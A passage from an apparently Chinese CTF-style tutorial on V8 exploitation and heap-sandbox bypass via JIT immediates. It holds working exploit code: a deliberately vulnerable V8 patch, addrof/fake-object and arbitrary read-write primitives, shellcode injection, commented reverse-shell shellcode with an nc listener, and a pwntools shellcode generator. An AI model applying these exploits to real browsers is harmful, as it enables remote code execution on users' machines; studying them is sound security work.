function_">arbitrary_address_read</span>(<span class="title function_">addressOf</span>(wasm_mod) - <span class="number">1n</span> + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x9090909090909090n</span>,</span><br><span class="line">    <span class="number">0x636c6163782fb848n</span>,</span><br><span class="line">    <span class="number">0x73752fb848500000n</span>,</span><br><span class="line">    <span class="number">0x8948506e69622f72n</span>,</span><br><span class="line">    <span class="number">0x89485750c03148e7n</span>,</span><br><span class="line">    <span class="number">0x3ac0c748d23148e6n</span>,</span><br><span class="line">    <span class="number">0x4944b84850000030n</span>,</span><br><span class="line">    <span class="number">0x48503d59414c5053n</span>,</span><br><span class="line">    <span class="number">0x485250c03148e289n</span>,</span><br><span class="line">    <span class="number">0x00003bc0c748e289n</span>,</span><br><span class="line">    <span class="number">0x0000000000050f00n</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment">// var shellcode=[</span></span><br><span class="line"><span class="comment">// 0x6a5f026a9958296an,</span></span><br><span class="line"><span class="comment">// 0xb9489748050f5e01n,</span></span><br><span class="line"><span class="comment">// 0x0100007f39300002n,</span></span><br><span class="line"><span class="comment">// 0x6a5a106ae6894851n,</span></span><br><span class="line"><span class="comment">// 0x485e036a050f582an,</span></span><br><span class="line"><span class="comment">// 0x75050f58216aceffn,</span></span><br><span class="line"><span class="comment">// 0x2fbb4899583b6af6n,</span></span><br><span class="line"><span class="comment">// 0x530068732f6e6962n,</span></span><br><span class="line"><span class="comment">// 0xe689485752e78948n,</span></span><br><span class="line"><span class="comment">// 0x000000000000050fn]</span></span><br><span class="line"><span class="comment">//nc -lvvp 12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure></div>

<h1 id="Heap-Sandbox"><a href="#Heap-Sandbox" class="headerlink" title="Heap Sandbox"></a>Heap Sandbox</h1><h2 id="指针压缩"><a href="#指针压缩" class="headerlink" title="指针压缩"></a>指针压缩</h2><p>以 <code>ArrayBuffer</code> 为例，正常情况下的内存分布如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/84a55035a025b34164f79326f8796c9a.png"
                      alt="在这里插入图片描述"
                ><br>  在 V8 高版本中会基于数据 4GB 对齐所有指针高 32 位相同而只保留低 32 位而指针（类似于32位下的 HeapObject 指针），而基址存放在 r13 寄存器指向的内存中，从而节省空间。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/2bb3db72d385bb5579b9a37487883e4f.png"
                      alt="在这里插入图片描述"
                ><br>因此 <code>ArrayBuffer</code> 的内存分布图如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/491e63bee3aaaeeac28f6f7d934998d8.png"
                      alt="在这里插入图片描述"
                ></p>
<p>  在地址泄露的时候可以将指针覆盖成 0 这样就可以泄露基址附近的数据，从而泄露基址。</p>
<h2 id="沙箱"><a href="#沙箱" class="headerlink" title="沙箱"></a>沙箱</h2><p>指针压缩的方法虽然在一定程度上把任意地址读写限制在了 4GB 的 V8 堆的范围内，然而 V8 的某些对象比如 <code>ArrayBuffer</code> 中还存在不指向 V8 对象的指针（例如示例中的 <code>BackingStorage</code> 和 <code>ArrayBufferExtension</code>），这些指针不会被指针压缩所以依然可以实现任意地址读写，而沙箱的作用就是限制这些指针的任意地址读写范围。</p>
<p>在开启沙箱后 <code>ArrayBuffer</code> 的内存分布图如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/9538d4de1f255ac0725b01321b99bd5e.png"
                      alt="在这里插入图片描述"
                ><br>沙箱的具体实现方式有两种：</p>
<ul>
<li><p>一种是类似上图中的 <code>ArrayBufferExtension</code> 指针。在开启沙箱后，<code>ArrayBufferExtension</code> 存储的不再是堆地址，而是一个叫做 External Pointer Table 的表的下标，而在这个表的对应索引处存放着 <code>ArrayBufferExtension</code> 对应结构的地址和类型。这样攻击者就只能访问 <code>ArrayBufferExtension</code> 中存放的信息对应的结构而不能实现任意地址读写且不易实现类型混淆。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/65caf838ed1c9b822d84de2c5345360d.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
<li><p>另一种类似上图中的 <code>BackingStorage</code>。在开启沙箱后 <code>BackingStorage</code> 指针存放的是  <code>BackingStorage</code> 地址与沙箱基址偏移（40bit）左移 24bit 的结果。这个方式和指针压缩相同（实际上基址也相同），只不过访问范围变为 1TB 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/faca1aa32ed99db16311c6d4f54a6f24.png"
                      alt="在这里插入图片描述"
                ></p>
</li>
</ul>
<p>因此沙箱的整体结构如下图所示：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/4ec6c1546af4bbefef120695be95d023.png"
                      alt="在这里插入图片描述" style="zoom: 50%;" 
                ><br>实际的调试结果如下图所示，注意 rwx 段不在沙箱中，因此利用 <code>ArrayBuffer</code> 无法将 shellcode 写入 rwx 段。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/f36c6062d602d751d82ae1ce88f43769.png"
                      alt="在这里插入图片描述"
                ></p>
<h2 id="沙箱绕过"><a href="#沙箱绕过" class="headerlink" title="沙箱绕过"></a>沙箱绕过</h2><h3 id="利用立即数写-shellcode"><a href="#利用立即数写-shellcode" class="headerlink" title="利用立即数写 shellcode"></a>利用立即数写 shellcode</h3><p>这里以一个 demo 为例介绍这种沙箱绕过方法。</p>
<p><a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/sandbox_bypass/imm_shellcode" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>首先搭建环境：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">git reset --hard bd5b3ae5422e9fa1d0f7a281bbdf709e6db65f62</span><br><span class="line">export DEPOT_TOOLS_UPDATE=0</span><br><span class="line">export PATH=$PATH:~/tools/depot_tools/</span><br><span class="line">gclient sync -D </span><br><span class="line">git apply ./sandbox.diff</span><br><span class="line">./build/install-build-deps.sh</span><br><span class="line">./tools/dev/gm.py x64.release</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>sandbox.diff</code> 文件内容如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index 49fe48d698..2944eb9edb 100644</span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ -395,6 +395,25 @@ BUILTIN(ArrayPush) &#123;</span><br><span class="line">   return *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line">+BUILTIN(ArrayLen) &#123;</span><br><span class="line">+  uint32_t len = args.length();</span><br><span class="line">+  if(len != 2) return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+</span><br><span class="line">+  Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+      isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+</span><br><span class="line">+  Handle&lt;Object&gt; argLen;</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+      isolate, argLen, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+  uint32_t newLen = static_cast&lt;uint32_t&gt;(argLen-&gt;Number());</span><br><span class="line">+</span><br><span class="line">+  auto raw = *array;</span><br><span class="line">+  raw.set_length(Smi::FromInt(newLen));</span><br><span class="line">+  return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> namespace &#123;</span><br><span class="line"> </span><br><span class="line"> V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index 859b5cee9a..a16a7d5ca1 100644</span><br><span class="line">--- a/src/builtins/builtins-definitions.h</span><br><span class="line">+++ b/src/builtins/builtins-definitions.h</span><br><span class="line">@@ -392,6 +392,7 @@ namespace internal &#123;</span><br><span class="line">   CPP(ArrayPrototypeGroupToMap)                                                \</span><br><span class="line">   /* ES6 #sec-array.prototype.push */                                          \</span><br><span class="line">   CPP(ArrayPush)                                                               \</span><br><span class="line">+  CPP(ArrayLen)                                                                \</span><br><span class="line">   TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel)                         \</span><br><span class="line">   /* ES6 #sec-array.prototype.shift */                                         \</span><br><span class="line">   CPP(ArrayShift)                                                              \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index 5888a5cdab..5d13eac799 100644</span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ -1880,6 +1880,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtin::kArrayPush:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    case Builtin::kArrayLen:</span><br><span class="line">+      return Type::Receiver();</span><br><span class="line">     case Builtin::kArrayPrototypeReverse:</span><br><span class="line">     case Builtin::kArrayPrototypeSlice:</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span><br><span class="line">index 7c7b917502..550b25d4ba 100644</span><br><span class="line">--- a/src/init/bootstrapper.cc</span><br><span class="line">+++ b/src/init/bootstrapper.cc</span><br><span class="line">@@ -1808,6 +1808,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           0, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;push&quot;, Builtin::kArrayPrototypePush,</span><br><span class="line">                           1, false);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;len&quot;, Builtin::kArrayLen,</span><br><span class="line">+                          2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;reverse&quot;,</span><br><span class="line">                           Builtin::kArrayPrototypeReverse, 0, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;shift&quot;,</span><br></pre></td></tr></table></figure></div>

<p>可以看出，这里在 v8 中添加了一个可以修改 <code>JSArray</code> 长度属性的操作 <code>len</code> 。</p>
<p>这里先实现一下 address of 和 fake object 两个利用原语，具体方法可以是越界写数组元素或伪造 <code>Map</code> 。</p>
<p>这里有几个需要注意的点：</p>
<ul>
<li>通过修改 <code>Map</code> 使得 <code>ObjectArray</code> 变为 <code>DoubleArray</code> 后可以以 double 形式读取到数组中的元素但是不能以 double 形式写入值，即数组的读和写的类型检查不同。如果想要能以 double 形式写入值需要伪造 <code>element</code> 的 <code>Map</code> 。</li>
<li>应当先触发 JIT 再实现两个利用原语，因为 JIT 会导致前面构造的 <code>Array</code> 的各个结构的相对位置发生变化。</li>
<li>通过 GC 将 Array 置于 Old Space 后 <code>elememt</code> 成员放到最后，不容易利用。</li>
<li>由于指针压缩导致成员大小是 4 字节，而 <code>DoubleArray</code> 是 8 字节写，因此需要注意尽量不要覆盖其它成员。</li>
</ul>
<p>首先有如下函数：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>上面这种形式的函数 JIT 后的汇编代码如下，显然其中的立即数是可以控制的，并且可以通过堆内任意地址写修改 <code>code_entry_point</code> 指向汇编代码中的立即数，因此可以像<a class="link"   href="https://gitcode.net/qq_45323960/attachment/-/tree/master/llvm_pass_pwn/ciscn2022_satool" >这道题 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>一样在立即数中写 shellcode 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/5e33756474098f1771e925e3d38b4e76.png"
                      alt="在这里插入图片描述"
                ><br>这里需要注意的是 <code>vmovsd</code> 函数在后面 <code>QWORD PTR [rcx+offset]</code> 中的 <code>offset</code> 在从 0x7f 变为 0x87 的时候指令长度增加了 3 字节，因此需要注意需要修改 <code>jmp</code> 的跳转偏移或者避免使用 rcx 寄存器。因为 rcx 被用来写数据所以原本是指向可读写的内存，因此指向下面这条指令不会出错。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/c31d9c0839fbe94e96957695e0ceb913.png"
                      alt="在这里插入图片描述"
                ><br>另外注意 shellcode 最终执行的是 <code>execve(&quot;/usr/bin/xcalc&quot;, &amp;&quot;/usr/bin/xcalc&quot;, &amp;&quot;DISPLAY=:0&quot;);</code> ，对应那些二级字符串指针的参数需要进行 0 截断。</p>
<p>exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line">oob_array.<span class="title function_">len</span>(<span class="number">114514</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fake_object</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">11</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    double_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(offset);</span><br><span class="line">    oob_array[<span class="number">11</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> double_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">18</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>) &lt;&lt; <span class="number">32n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">18</span>]) &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">18</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>) &lt;&lt; <span class="number">32n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">18</span>]) &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">shellcode_offset = <span class="title function_">offset_of</span>(shellcode);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak_offset = (<span class="title function_">read</span>(shellcode_offset + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>) + <span class="number">8n</span>;</span><br><span class="line">leak_data = <span class="title function_">read</span>(leak_offset);</span><br><span class="line"></span><br><span class="line">code = leak_data &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">code_entry_point = leak_data &gt;&gt; <span class="number">32n</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write</span>(leak_offset, code | ((code_entry_point + <span class="number">0x66n</span>) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line"><span class="title function_">print</span>(<span class="string">&quot;[*] leak offset: &quot;</span> + <span class="title function_">hex</span>(leak_offset));</span><br><span class="line"></span><br><span class="line"><span class="comment">// %DebugPrint(shellcode);</span></span><br><span class="line"><span class="comment">// % SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div>
<p>通常可以使用如下脚本生成 shellcode 。注意跳转距离可能会有变化，需要调整。</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">iss=<span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">global</span> iss</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(iss)+<span class="string">&#x27;:&#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(x)))</span><br><span class="line">    jmp = <span class="string">b&#x27;\xeb\x0c&#x27;</span></span><br><span class="line">    <span class="comment"># if iss&lt;=11: &#x27;</span></span><br><span class="line">    <span class="comment"># else :jmp=b&quot;\xeb\x16&quot;</span></span><br><span class="line">    iss +=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> u64(x.ljust(<span class="number">6</span>, <span class="string">b&#x27;\x90&#x27;</span>) + jmp)</span><br><span class="line"><span class="comment">#orw flag.txt</span></span><br><span class="line"><span class="comment"># imm1 = [</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov eax,0x7478742e&quot;), # &quot;.txt&quot;</span></span><br><span class="line"><span class="comment">#    asm(&quot;push 0;shl rax,0x20&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;add rax,0x67616c66&quot;), # &quot;flag&quot;</span></span><br><span class="line"><span class="comment">#    asm(&quot;push rax&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov rdi, rsp; xor rsi, rsi&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov eax, 2&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;xor edx, edx;syscall&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov edi,3&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;lea rsi, [rsp-8]&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov edx, 0x80&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;xor eax, eax;syscall;xor edi, edi&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov al, 1;syscall;&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov al,59;syscall;&quot;)</span></span><br><span class="line"><span class="comment"># ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, 0, 0);</span></span><br><span class="line"><span class="comment"># imm1 = [</span></span><br><span class="line"><span class="comment">#    asm(&quot;push 0x67616c66&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov rdi, rsp; xor rsi, rsi&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov eax, 2&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;xor edx, edx;syscall&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov edi,3&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;lea rsi, [rsp-8]&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov edx, 0x80&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;xor eax, eax;syscall;xor edi, edi&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov al, 1;syscall&quot;),</span></span><br><span class="line"><span class="comment">#    asm(&quot;mov al,60;syscall;&quot;)</span></span><br><span class="line"><span class="comment"># ]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># execve(&quot;/bin/sh&quot;, &#123;&quot;cat&quot;, &quot;flag&quot;, NULL&#125;, 0);</span></span><br><span class="line">imm1 = [</span><br><span class="line">    asm(<span class="string">&quot;mov eax,0x7478742e&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;push 0;shl rax,0x20&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;add rax,0x67616c66&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;push rax;push 0x746163&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;push 0&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;lea rax, [rsp+0x10];push rax&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;sub rax, 8; push rax&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;mov rsi, rsp&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;mov eax,0x68732f&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;shl rax, 0x20&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;add rax, 0x6e69622f&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;push rax;mov rdi, rsp;&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;mov eax, 59&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;xor edx, edx;syscall&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;mov rdi,rsi&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;xor esi, esi&quot;</span>),</span><br><span class="line">    asm(<span class="string">&quot;syscall&quot;</span>)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">imm1 = [convert(x) <span class="keyword">for</span> x <span class="keyword">in</span> imm1]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sd <span class="keyword">in</span> imm1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;u2d(&#x27;</span>+<span class="built_in">str</span>(sd)+<span class="string">&quot;n&quot;</span>+<span class="string">&quot;),&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>然后使用如下脚本将生成的 shellcode 转为 浮点数。</p>
